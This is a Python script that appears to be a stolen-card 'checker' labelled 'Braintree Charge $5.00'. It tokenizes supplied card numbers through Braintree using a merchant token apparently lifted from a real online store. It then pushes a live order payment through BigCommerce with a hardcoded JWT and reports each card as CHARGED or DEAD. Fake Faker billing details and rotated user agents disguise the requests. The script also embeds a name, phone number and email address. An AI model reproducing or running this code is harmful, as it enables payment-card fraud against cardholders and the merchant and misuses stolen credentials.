import aiohttp
import asyncio
import random
import json
import uuid
import time
import re
from faker import Faker

# Config
GATE_NAME = 'Braintree Charge $5.00'
MERCHANT_AUTH = "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjczMjg4NzMsImp0aSI6IjcxNmQ3ZDFhLTUyMDgtNDkzNy04YTdkLWY0OGYzZDg0NWI4OCIsInN1YiI6Imh4ZGNmcDVoeWZmNmgzNzYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imh4ZGNmcDVoeWZmNmgzNzYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJhdWQiOlsicm90b21ldGFscy5jb20iLCJ3d3cucm90b21ldGFscy5jb20iXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJyb3RvbWV0YWxzaW5jX2luc3RhbnQiLCJwYXlwYWxfY2xpZW50X2lkIjoiQVZQVDYwNHV6VjEtM0o1MHNvUzVfYUtOWHliaDdmZEtCUHJFZk12QlJMS2MtbkxETjlINTI1bXF4cHFaSmd1R2pMUUREc0J1bW14UU9Bc1QifX0.MVV27c5bHYy-6PJ1Oo7S4uKqwuNPlpqXdaezIi5CwlzolgABxZYATBQ336jwTGOHjFXot4ZWldW8NDUhUTMdHA"
BIGCOMMERCE_JWT = "eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NjcyNDgyOTMsIm5iZiI6MTc2NzI0NDY5MywiaXNzIjoicGF5bWVudHMuYmlnY29tbWVyY2UuY29tIiwic3ViIjoxMDA2NTI4LCJqdGkiOiJiOWY5NjdmZS02NThlLTQ4ZGUtOTdiZC0wYjA5NzlhZDU5NDgiLCJpYXQiOjE3NjcyNDQ2OTMsImRhdGEiOnsic3RvcmVfaWQiOiIxMDA2NTI4Iiwib3JkZXJfaWQiOiIxODkxOTQiLCJhbW91bnQiOjU1NzYsImN1cnJlbmN5IjoiVVNEIiwic3RvcmVfdXJsIjoiaHR0cHM6Ly93d3cucm90b21ldGFscy5jb20iLCJmb3JtX2lkIjoidW5rbm93biIsInBheW1lbnRfY29udGV4dCI6ImNoZWNrb3V0IiwicGF5bWVudF90eXBlIjoiZWNvbW1lcmNlIn19.LQfiOMcFg41OwypueDC21-kSdAcY5G7xrH-HLqeGT78"

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
]

def generate_billing():
    fake = Faker()
    return {
        'first_name': fake.first_name(),
        'last_name': fake.last_name(),
        'email': fake.email(),
        'phone': '682' + str(random.randint(1000000, 9999999)),
        'street': str(random.randint(100, 9999)) + ' Main St',
        'city': 'New York',
        'state_code': 'NY',
        'zip': '10001'
    }

async def check_b3n(cc, mm, yy, cvv):
    async with aiohttp.ClientSession() as session:
        billing = generate_billing()
        ua = random.choice(USER_AGENTS)
        
        tokenize_headers = {
            'authority': 'payments.braintree-api.com',
            'authorization': f'Bearer {MERCHANT_AUTH}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': ua,
        }
        
        tokenize_data = {
            "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(uuid.uuid4())},
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial } } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvv,
                        "cardholderName": f"{billing['first_name']} {billing['last_name']}",
                        "billingAddress": {"countryName": "United States", "postalCode": "10080", "streetAddress": "Street 108"}
                    },
                    "options": {"validate": False}
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        
        try:
            async with session.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=tokenize_data) as r1:
                res1 = await r1.json()
                
                # Safely extract token
                data = res1.get('data') or {}
                tokenize_cc = data.get('tokenizeCreditCard') or {}
                token = tokenize_cc.get('token')
                
                if not token:
                    # Check for errors in response
                    errors = res1.get('errors')
                    error_msg = 'Tokenization Failed'
                    if errors and isinstance(errors, list) and len(errors) > 0:
                        err_obj = errors[0] or {}
                        error_msg = err_obj.get('message', 'Tokenization Failed')
                    return {'status': 'DEAD', 'response': error_msg}
                
                pay_headers = {
                    'Accept': 'application/json',
                    'Authorization': f'JWT {BIGCOMMERCE_JWT}',
                    'Content-Type': 'application/json',
                    'Origin': 'https://www.rotometals.com',
                    'Referer': 'https://www.rotometals.com/',
                    'User-Agent': ua,
                }
                
                pay_data = {
                    "customer": {"geo_ip_country_code": "US", "session_token": uuid.uuid4().hex},
                    "notify_url": "https://internalapi-1006528.mybigcommerce.com/internalapi/v1/checkout/order/189194/payment",
                    "order": {
                        "billing_address": {
                            "city": "New York", "company": "Oxygen", "country_code": "US", "country": "United States",
                            "first_name": "Fazil", "last_name": "Aggayz", "phone": "0665618205",
                            "state_code": "NY", "state": "New York", "street_1": "Street 108", "zip": "10080", "email": "Binbhai000@gmail.com"
                        },
                        "coupons": [], "currency": "USD", "id": "189194",
                        "items": [{"code": str(uuid.uuid4()), "variant_id": 1029, "name": "Antimony Shot", "price": 4499, "unit_price": 4499, "quantity": 1, "sku": "ANTIMONY"}],
                        "shipping": [{"method": "Flat rate"}],
                        "shipping_address": {"city": "New York", "company": "Oxygen", "country_code": "US", "country": "United States", "first_name": "Fazil", "last_name": "Aggayz", "phone": "0665618205", "state_code": "NY", "state": "New York", "street_1": "Street 108", "zip": "10080"},
                        "token": uuid.uuid4().hex,
                        "totals": {"grand_total": 5576, "handling": 0, "shipping": 1077, "subtotal": 4499, "tax": 0}
                    },
                    "payment": {
                        "device_info": json.dumps({"correlation_id": str(uuid.uuid4())[:20]}),
                        "gateway": "braintree",
                        "notify_url": "https://internalapi-1006528.mybigcommerce.com/internalapi/v1/checkout/order/189194/payment",
                        "vault_payment_instrument": False,
                        "method": "credit-card",
                        "credit_card_token": {"token": token}
                    },
                    "store": {"hash": "cra054", "id": "1006528", "name": "RotoMetals"}
                }
                
                async with session.post('https://payments.bigcommerce.com/api/public/v1/orders/payments', headers=pay_headers, json=pay_data) as r2:
                    res2 = await r2.text()
                    
                    if '"result":"success"' in res2:
                        return {'status': 'CHARGED', 'response': 'Charged $54.00 ✅'}
                    
                    error_match = re.search(r'"errors":\[{"code":"([^"]+)"', res2)
                    error_msg = error_match.group(1) if error_match else 'Declined'
                    return {'status': 'DEAD', 'response': error_msg}
                    
        except Exception as e:
            return {'status': 'ERROR', 'response': str(e)}
